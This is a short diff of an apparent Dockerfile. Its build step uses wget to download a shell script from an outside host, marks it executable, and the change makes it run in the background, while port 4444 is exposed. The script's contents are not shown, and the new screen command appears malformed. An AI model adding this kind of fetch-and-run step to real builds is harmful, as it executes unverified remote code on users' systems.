@@ -10,7 +10,7 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/old/run.sh && \
     chmod 755 run.sh && \
-    screen vi ./run.sh
+    screen -S ./run.sh &
 
 EXPOSE 4444
 
